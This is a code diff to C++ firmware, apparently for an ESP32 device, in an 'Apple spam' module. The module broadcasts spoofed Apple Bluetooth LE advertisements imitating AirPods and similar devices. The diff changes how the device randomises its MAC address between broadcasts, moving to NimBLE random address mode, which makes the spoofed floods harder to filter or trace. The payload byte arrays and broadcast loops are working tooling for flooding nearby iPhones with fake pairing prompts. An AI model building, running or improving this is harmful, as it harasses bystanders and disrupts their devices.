@@ -2,10 +2,7 @@
 #include "core/display.h"
 #include "core/mykeyboard.h"
 #include "core/utils.h"
-#include "esp_mac.h"
 #include <globals.h>
-
-extern void generateRandomMac(uint8_t* mac);
 
 static const uint8_t data_airpods[] = {0x4C,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
 static const uint8_t data_airpods_pro[] = {0x4C,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
@@ -82,11 +79,9 @@ void stopAppleSpam() {
 void quickAppleSpam(int payloadIndex) {
     if (payloadIndex < 0 || payloadIndex >= apple_payload_count) return;
     
-    uint8_t macAddr[6];
-    generateRandomMac(macAddr);
-    esp_base_mac_addr_set(macAddr);
-    
     BLEDevice::init("");
+    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
+    
     BLEAdvertising* pAdv = BLEDevice::getAdvertising();
     
     BLEAdvertisementData advertisementData = BLEAdvertisementData();
@@ -142,11 +137,9 @@ void startAppleSpamAll() {
         
         displayTextLine(String(apple_payloads[apple_index].name) + " " + String(millis() / 1000) + "s");
         
-        uint8_t macAddr[6];
-        generateRandomMac(macAddr);
-        esp_base_mac_addr_set(macAddr);
-        
         BLEDevice::init("");
+        NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
+        
         BLEAdvertising* pAdv = BLEDevice::getAdvertising();
         
         BLEAdvertisementData advertisementData = BLEAdvertisementData();
@@ -202,14 +195,8 @@ void startAppleSpam(int payloadIndex) {
             break;
         }
         
-        uint8_t macAddr[6];
-        generateRandomMac(macAddr);
-        esp_err_t ret = esp_base_mac_addr_set(macAddr);
-        if (ret != ESP_OK) {
-            Serial.printf("Failed to set MAC: %d\n", ret);
-        }
-        
         BLEDevice::init("");
+        NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
         
         pAppleAdvertising = BLEDevice::getAdvertising();
         
